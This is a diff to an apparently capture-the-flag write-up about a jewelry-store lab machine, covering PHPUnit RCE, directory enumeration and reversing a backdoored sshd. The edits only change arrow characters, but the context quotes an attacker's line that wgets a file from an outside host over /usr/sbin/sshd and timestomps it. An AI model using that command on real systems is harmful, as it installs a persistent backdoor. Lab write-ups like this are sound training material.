@@ -15,7 +15,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-### DJewelry --> PHPUnit RCE
+### DJewelry -> PHPUnit RCE
 
 The website is a company page:
 
@@ -50,14 +50,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 /.php                 (Status: 403) [Size: 283]
 /index.php            (Status: 200) [Size: 6215]
-/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
+/images               (Status: 301) [Size: 325] [-> http://store.djewelry.htb/images/]
 /login.php            (Status: 200) [Size: 4129]
 /products.php         (Status: 200) [Size: 7447]
 /cart.php             (Status: 200) [Size: 4396]
-/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]
-/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]
-/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
-/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/]
+/css                  (Status: 301) [Size: 322] [-> http://store.djewelry.htb/css/]
+/js                   (Status: 301) [Size: 321] [-> http://store.djewelry.htb/js/]
+/vendor               (Status: 301) [Size: 325] [-> http://store.djewelry.htb/vendor/]
+/fonts                (Status: 301) [Size: 324] [-> http://store.djewelry.htb/fonts/]
 ```
 
 When we view the `/vendor` endpoint, we see a file system with different PHP libraries:
@@ -225,7 +225,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 `sshd` is in use here, so let's download that binary back to our machine since RE seems to be the path forward in this machine.&#x20;
 
-### sshd RE --> Root Pwd
+### sshd RE -> Root Pwd
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
